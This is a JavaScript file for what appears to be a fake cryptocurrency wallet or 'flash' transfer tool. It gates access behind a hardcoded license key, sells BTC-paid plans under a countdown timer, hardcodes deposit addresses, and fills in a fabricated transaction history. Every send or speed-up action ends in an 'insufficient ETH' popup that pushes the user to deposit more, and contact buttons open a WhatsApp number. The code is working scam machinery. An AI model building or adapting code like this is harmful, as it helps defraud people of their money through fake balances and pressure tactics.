document.addEventListener('DOMContentLoaded', () => {
  // License Activation
  const activateBtn = document.getElementById('activateBtn');
  const licenseKeyInput = document.getElementById('licenseKey');
  const activationCodeInput = document.getElementById('activationCode');
  const invalidLicensePopup = document.getElementById('invalidLicensePopup');
  const walletPage = document.getElementById('walletPage');

  activateBtn.addEventListener('click', () => {
    const licenseKey = licenseKeyInput.value;
    const activationCode = activationCodeInput.value;

    if (licenseKey === 'G56FT34' && activationCode === 'R539JY') {
      showLoadingAnimation();
      setTimeout(() => {
        document.querySelector('.container').style.display = 'none';
        walletPage.style.display = 'block';
      }, 3000);
    } else {
      showPopup(invalidLicensePopup);
    }
  });

  function showLoadingAnimation() {
    const loadingAnimation = document.createElement('div');
    loadingAnimation.style.position = 'fixed';
    loadingAnimation.style.top = '0';
    loadingAnimation.style.left = '0';
    loadingAnimation.style.width = '100%';
    loadingAnimation.style.height = '100%';
    loadingAnimation.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
    loadingAnimation.style.display = 'flex';
    loadingAnimation.style.justifyContent = 'center';
    loadingAnimation.style.alignItems = 'center';
    loadingAnimation.style.zIndex = '9999';

    const spinner = document.createElement('div');
    spinner.style.width = '50px';
    spinner.style.height = '50px';
    spinner.style.border = '5px solid #f3f3f3';
    spinner.style.borderTop = '5px solid var(--primary-color)';
    spinner.style.borderRadius = '50%';
    spinner.style.animation = 'spin 1s linear infinite';

    loadingAnimation.appendChild(spinner);
    document.body.appendChild(loadingAnimation);

    const style = document.createElement('style');
    style.textContent = `
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    `;
    document.head.appendChild(style);

    setTimeout(() => {
      document.body.removeChild(loadingAnimation);
    }, 3000);
  }

  // Purchase Buttons
  const purchaseButtons = document.querySelectorAll('.purchaseBtn');
  const paymentPopup = document.getElementById('paymentPopup');
  const btcAddressElement = document.getElementById('btcAddress');
  const paymentAmountElement = document.getElementById('paymentAmount');
  const copyBtcAddressBtn = document.getElementById('copyBtcAddress');
  const countdownElement = document.getElementById('countdown');

  purchaseButtons.forEach(button => {
    button.addEventListener('click', () => {
      const plan = button.getAttribute('data-plan');
      let amount, btcAmount;

      switch (plan) {
        case 'elite':
          amount = '1,500 USD';
          btcAmount = '0.02447091 BTC';
          break;
        case 'lite':
          amount = '100 USD';
          btcAmount = '0.00163677 BTC';
          break;
        case 'enterprise':
          amount = '500 USD';
          btcAmount = '0.00818144 BTC';
          break;
      }

      paymentAmountElement.textContent = `${btcAmount} (${amount})`;
      showPopup(paymentPopup);
      startCountdown(35 * 60); // 35 minutes in seconds
    });
  });

  copyBtcAddressBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(btcAddressElement.textContent)
      .then(() => alert('BTC address copied to clipboard!'))
      .catch(err => console.error('Failed to copy: ', err));
  });

  function startCountdown(duration) {
    let timer = duration, minutes, seconds;
    const countdownInterval = setInterval(function () {
      minutes = parseInt(timer / 60, 10);
      seconds = parseInt(timer % 60, 10);

      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      countdownElement.textContent = minutes + ":" + seconds;

      if (--timer < 0) {
        clearInterval(countdownInterval);
        countdownElement.textContent = "Time's up!";
      }
    }, 1000);
  }

  // Contact Buttons
  const contactButtons = document.querySelectorAll('.contactBtn');

  contactButtons.forEach(button => {
    button.addEventListener('click', () => {
      window.open('https://wa.me/447753831282', '_blank');
    });
  });

  // Load Wallet
  const loadBtn = document.getElementById('loadBtn');
  const loadWalletPopup = document.getElementById('loadWalletPopup');
  const coinSelect = document.getElementById('coinSelect');
  const depositAddressElement = document.getElementById('depositAddress');
  const copyDepositAddressBtn = document.getElementById('copyDepositAddress');

  loadBtn.addEventListener('click', () => {
    showPopup(loadWalletPopup);
  });

  coinSelect.addEventListener('change', () => {
    const selectedCoin = coinSelect.value;
    let address;

    switch (selectedCoin) {
      case 'ETH':
      case 'BNB':
        address = '0xB1B9a6Ea97EFBe291c241a18Ff89227cA428AFF9';
        break;
      case 'BTC':
        address = 'bc1qvyzw9wdtru8equvj64scy5nn5swqv8njenmhls';
        break;
      default:
        address = '';
    }

    depositAddressElement.textContent = address;
  });

  copyDepositAddressBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(depositAddressElement.textContent)
      .then(() => alert('Address copied to clipboard!'))
      .catch(err => console.error('Failed to copy: ', err));
  });

  // Transfer USDT
  const transferBtn = document.getElementById('transferBtn');
  const transferPopup = document.getElementById('transferPopup');
  const sendUsdtBtn = document.getElementById('sendUsdtBtn');
  const insufficientEthPopup = document.getElementById('insufficientEthPopup');

  transferBtn.addEventListener('click', () => {
    showPopup(transferPopup);
  });

  sendUsdtBtn.addEventListener('click', () => {
    showPopup(insufficientEthPopup);
  });

  // Transaction History
  const transactionHistory = document.getElementById('transactionHistory');
  const transactions = [
    { date: '2023-06-01 10:30', value: '$1,250.00', status: 'Pending', details: 'ETH Transfer to 0x7a9f...3d2c' },
    { date: '2023-06-02 14:15', value: '$3,750.00', status: 'Completed', details: 'BTC Withdrawal to 1BvBM...NJG4' },
    { date: '2023-06-03 09:45', value: '$500.00', status: 'Pending', details: 'USDT Deposit from 0x8f3c...9a1b' },
    { date: '2023-06-04 16:20', value: '$2,100.00', status: 'Failed', details: 'BNB Swap to ETH' },
    { date: '2023-06-05 11:55', value: '$890.00', status: 'Completed', details: 'ETH Purchase from Coinbase' }
  ];

  transactions.forEach(transaction => {
    const row = document.createElement('tr');
    row.innerHTML = `
      <td>${transaction.date}</td>
      <td>${transaction.value}</td>
      <td>${transaction.status}</td>
      <td>${transaction.details}</td>
    `;
    transactionHistory.appendChild(row);
  });

  // Speed Up Transactions
  const speedUpBtn = document.getElementById('speedUpBtn');
  const speedUpPopup = document.getElementById('speedUpPopup');
  const confirmSpeedUpBtn = document.getElementById('confirmSpeedUpBtn');
  const insufficientEthSpeedUpPopup = document.getElementById('insufficientEthSpeedUpPopup');

  speedUpBtn.addEventListener('click', () => {
    showPopup(speedUpPopup);
  });

  confirmSpeedUpBtn.addEventListener('click', () => {
    showPopup(insufficientEthSpeedUpPopup);
  });

  // Helper function to show popups
  function showPopup(popup) {
    popup.style.display = 'block';
  }

  // Close popups
  const closeButtons = document.querySelectorAll('.close-popup');
  closeButtons.forEach(button => {
    button.addEventListener('click', () => {
      button.closest('.popup').style.display = 'none';
    });
  });

  // Copy address buttons
  const copyButtons = document.querySelectorAll('.copy-btn');
  copyButtons.forEach(button => {
    button.addEventListener('click', () => {
      const address = button.getAttribute('data-address');
      navigator.clipboard.writeText(address)
        .then(() => alert('Address copied to clipboard!'))
        .catch(err => console.error('Failed to copy: ', err));
    });
  });
});